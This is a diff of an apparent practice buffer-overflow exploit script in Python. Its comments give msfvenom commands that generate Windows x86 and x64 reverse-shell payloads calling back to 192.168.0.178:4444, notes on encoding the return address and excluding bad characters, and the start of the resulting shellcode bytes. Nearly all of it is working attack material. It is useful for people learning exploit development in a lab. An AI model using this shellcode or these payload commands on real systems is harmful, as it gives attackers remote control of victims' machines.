@@ -11,11 +11,14 @@ import sys, socket
 # After our As we are going to enter the addresses returned in the previous line in reverse in hex format e.g. 625011af = \xaf\x11\x50\x62
 
 
-# This overflow was generated using msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.178 LPORT=4445 EXITFUNC=thread -f c -a x86 -b "\x00"
+# This overflow was generated using msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.178 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 # Apparently EXITFUNC=thread makes it more s_string_variable
 # -f = file type in this case C
 # -a = architecture in this case x86
 # -b = bad characters not to be used in the overflow code = in this case"\x00" is the null byte
+
+# Overflow also generated using msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.178 LPORT=4444 EXITFUNC=thread -f c -a x64 -b "\x00"
+# The current overflow is x64
 
 overflow = ("\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
 "\xff\xff\x48\xbb\xd1\xf7\x67\xc1\x23\x4f\x7d\x38\x48\x31\x58"
